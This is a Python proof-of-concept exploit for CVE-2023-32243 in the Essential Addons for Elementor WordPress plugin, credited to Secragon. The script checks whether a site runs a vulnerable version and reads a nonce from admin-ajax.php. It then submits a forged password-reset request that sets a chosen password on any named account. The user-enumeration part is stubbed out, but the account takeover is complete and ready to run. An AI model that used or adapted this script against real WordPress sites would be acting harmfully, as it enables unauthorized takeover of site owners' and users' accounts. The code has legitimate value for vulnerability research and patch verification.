# CVE-2023-32243
# Essential Addons for Elementor Unauthorized Account Takeover Exploit 
# by Secragon
# PoC for educational/research purposes only
# Use it at your own risk!

import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style


def check_version(target):
    
    print(Style.RESET_ALL + "Essential Addons version:", end=' ')
    try:
        r = requests.get(f"{target}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]

    except:
        print(Fore.RED + f'error...')
        exit()


    if int(version.replace('.','')) < 572 and int(version.replace('.','')) > 539:
        print(Fore.GREEN + f'{version} - vulnerable!')
    else:
        print(Fore.RED + f'{version} - not vulnerable!')
        exit()


def enumerate_users(target, count):

    print(Style.RESET_ALL + "Enumerating users:")
    # last minute change :)
    print(Fore.RED + "... nah... be creative...")
    
    exit()


def exploit(target, username, password):

	data = {
		'action':'eael_get_token'
	}

	s = requests.Session()
	print(Style.RESET_ALL + "Getting nonce:", end=' ')
	try:
	    r = s.post(f'{target}/wp-admin/admin-ajax.php', data=data, verify=False)
	except:
	    print(Fore.RED + f'error...')
	    exit()

	try:
		nonce = re.search(r"\"nonce\":\"(.*)\"}", r.text).groups()[0]
		print(Fore.GREEN + f"{nonce}")
	except:
		print(Fore.RED + f'error...')
		exit()

	payload = {
		'eael-resetpassword-submit': 'Reset',
		'widget_id': 1,
		'page_id': 1,
		'eael-resetpassword-nonce': nonce,
		'eael-pass1': password,
		'eael-pass2': password,
		'rp_login': username
	}

	print(Style.RESET_ALL + "Triggering exploit:", end=' ')
	try:
	    r = s.post(f'{target}/wp-admin/admin-ajax.php', data=payload, verify=False)
	except:
	    print(Fore.RED + f'error...')
	    exit()

	if re.search(r"Your password has been reset", r.text) != None:
		print(Fore.GREEN + "done")
	else:
		print(Fore.RED + "error...")
		exit()

	print()
	print(Style.RESET_ALL + "All set! You can now login using the following credentials:")
	print(f'Username: {username}')
	print(f'Password: {password}')
	print()



print()
print(Fore.BLUE + "\t\t --- Essential Addons Exploit ---")
print("\t\t (unauthorized account takeover)")
print(Fore.RED + "\t\t\t\t\tby gbrsh@secragon & gnomer0x@secragon")
print(Style.RESET_ALL)


parser = argparse.ArgumentParser(	
									description='Exploit for CVE-2023-32243.',
									epilog='Use -s option to scan for accounts. No exploitation will be triggered.'
								)


parser.add_argument('url', help='http://wphost')
parser.add_argument('-s', '--scan', required=False, type=int, help="Accounts scan mode. Value = max Id to scan.")
parser.add_argument('-u', '--username', required=False, help="Account to takeover")
parser.add_argument('-p', '--password', required=False, help="New password for the account")



if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()

if args.scan:
	enumerate_users(args.url, args.scan)


check_version(args.url)
exploit(args.url, args.username, args.password)
